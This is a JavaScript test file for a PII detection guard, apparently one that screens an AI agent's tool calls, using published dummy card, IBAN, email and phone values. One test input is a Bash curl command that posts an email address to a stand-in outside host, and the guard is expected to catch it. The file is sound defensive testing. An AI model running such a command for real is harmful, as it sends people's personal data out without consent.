import { test } from 'node:test';
import assert from 'node:assert/strict';
import { generic, iban, luhn } from '../src/detectors/generic.mjs';
import { detectPii, pii } from '../src/guards/pii.mjs';
import { config, context } from './helpers.mjs';
// Published test shapes, assembled so repository scans contain no literal IDs.
const card = ['4111', '1111', '1111', '1111'].join('');
const account = ['GB', '82', 'WEST', '1234', '5698', '7654', '32'].join('');
const email = ['nobody', '@', 'example.invalid'].join('');
const phone = ['+1', '202', '555', '0199'].join(' ');
for (const [kind, value] of [['email', email], ['phone', phone], ['credit-card', card], ['iban', account]]) {
  test(`generic PII: ${kind}`, () => assert.ok(generic.detect(value).some(f => f.kind === kind)));
}
test('checksum rejection, formatted values and benign text', () => {
  assert.equal(luhn(card), true);
  assert.equal(luhn(card.slice(0, -1) + '2'), false);
  assert.equal(luhn('0'.repeat(16)), false);
  assert.equal(iban(account), true);
  assert.equal(iban(account.slice(0, -1) + '3'), false);
  assert.equal(iban('GB00' + 'A'.repeat(40)), false);
  assert.ok(generic.detect(account.match(/.{1,4}/g).join(' ')).some(f => f.kind === 'iban'));
  assert.ok(generic.detect(`account ${account} for a fake invoice`).some(f => f.kind === 'iban'));
  for (const text of ['version 0.1.0', 'date 2026-10-22', 'hello world', 'id 12345', 'user at example dot invalid']) { assert.deepEqual(generic.detect(text), []); }
});
test('PII scopes, redaction and plugins', () => {
  const rule = { ...config.rules.pii, mode: 'deny' };
  assert.deepEqual(pii(context('Write', { content: email }), rule, config.rules.outbound), []);
  assert.ok(pii(context('mcp__fs__read_file', { data: email }), rule, config.rules.outbound).length);
  assert.ok(pii(context('Bash', { command: `curl --data '${email}' https://example.invalid` }), rule, config.rules.outbound).length);
  const locale = { id: 'fake-locale', detect: text => text.includes('FAKE-ID') ? [{ kind: 'local-id', index: 0 }] : [] };
  const result = pii(context('mcp__example__send', { data: 'FAKE-ID' }), { ...rule, detectors: ['fake-locale'] }, config.rules.outbound, [locale]);
  assert.equal(result.length, 1);
  assert.ok(!JSON.stringify(detectPii(email, [generic])).includes(email));
  assert.throws(() => pii(context('mcp__example__send'), { ...rule, detectors: ['missing'] }, config.rules.outbound));
});
